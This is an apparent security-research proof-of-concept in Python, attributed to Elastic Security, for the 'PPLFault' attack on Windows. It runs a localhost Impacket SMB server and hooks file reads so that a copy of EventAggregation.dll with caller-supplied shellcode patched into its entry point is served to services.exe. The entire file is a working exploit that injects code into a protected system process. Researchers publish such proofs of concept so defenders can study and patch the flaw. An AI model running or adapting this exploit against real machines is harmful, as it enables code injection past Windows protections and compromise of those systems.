# PPLFault Localhost SMB Exploit
#   Gabriel Landau (@GabrielLandau) @ Elastic Security
#
# Wraps Impacket SMB server to serve two versions of a file for the same path.

import os
import msvcrt
import pefile
import argparse
import win32con
import win32file

from impacket import smbserver

HOOK_FD = None
READ_COUNT = 0
ORIG_READ = None
ORIG_LSEEK = None

def hook_read(fd, n):
    global HOOK_FD, READ_COUNT, ORIG_READ
    
    READ_COUNT += 1
    file_path = win32file.GetFinalPathNameByHandle(msvcrt.get_osfhandle(fd), win32con.VOLUME_NAME_NONE)
    
    if 'EventAggregation' in file_path:
        if READ_COUNT >= 3:
            fd = HOOK_FD
            print(f"Hooked read #{READ_COUNT}: PATCH")
        else:
            print(f"Hooked read #{READ_COUNT}: PASSTHROUGH")
    
    return ORIG_READ(fd, n)

def hook_lseek(fd, pos, how):
    global HOOK_FD, READ_COUNT, ORIG_LSEEK
    file_path = win32file.GetFinalPathNameByHandle(msvcrt.get_osfhandle(fd), win32con.VOLUME_NAME_NONE)
    
    if 'EventAggregation' in file_path:
        fd = HOOK_FD
    
    ORIG_LSEEK(fd, pos, how)

def patch(payload_hex):
    global HOOK_FD, ORIG_READ, ORIG_LSEEK
   
    src_path = r"C:\Windows\System32\EventAggregation.dll.bak"
    fc = open(src_path,'rb').read()
    
    payload = bytes.fromhex(payload_hex)
    pe = pefile.PE(src_path)
    offset = pe.get_offset_from_rva(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
    length = len(payload)
    
    # Patch DllMain() with the payload
    patched_path = ".\EventAggregation.dll.patched"
    with open(patched_path,'wb') as out:       
        out.write(fc[:offset])
        out.write(payload)
        out.write(fc[offset+length:])
    
    HOOK_FD = os.open(patched_path, os.O_RDONLY | os.O_BINARY)
      
    ORIG_READ = os.read
    os.read = hook_read
    
    ORIG_LSEEK = os.lseek
    os.lseek = hook_lseek
        
if __name__ == '__main__':

    parser = argparse.ArgumentParser(add_help = True)
    parser.add_argument('-payload', action='store', default="ebfe", help='Shellcode payload for services.exe (hex - default EBFE infinite loop)')
    options = parser.parse_args()

    server = smbserver.SimpleSMBServer(listenAddress='127.0.0.1', listenPort=445)
    server.addShare('C$', 'C:\\', '')
    server.setSMB2Support(True)
    server.setSMBChallenge('')
    server.setLogFile('')
    
    patch(options.payload)
    server.start()
